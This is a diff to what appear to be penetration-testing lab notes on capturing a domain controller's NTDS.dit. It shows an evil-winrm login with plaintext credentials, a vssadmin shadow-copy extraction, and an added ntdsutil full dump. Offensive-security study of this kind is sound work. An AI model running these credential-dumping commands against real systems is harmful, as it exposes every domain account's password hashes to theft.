@@ -220,7 +220,8 @@ netexec smb 10.129.111.214 -u posi -p passwords2
 
 ### Capturing NTDS.dit
 
-```
+**vssadmin**
+```powershell
 evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
 
 ## Checking Local Group Membership of Administrators 
@@ -232,6 +233,10 @@ vssadmin CREATE SHADOW /For=C:
 ## Copying NTDS.dit from the VSS
 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 
+```
+**ntdsutil**
+```powershell
+powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
 ```
 
 ### A Faster Method: Using cme to Capture NTDS.dit
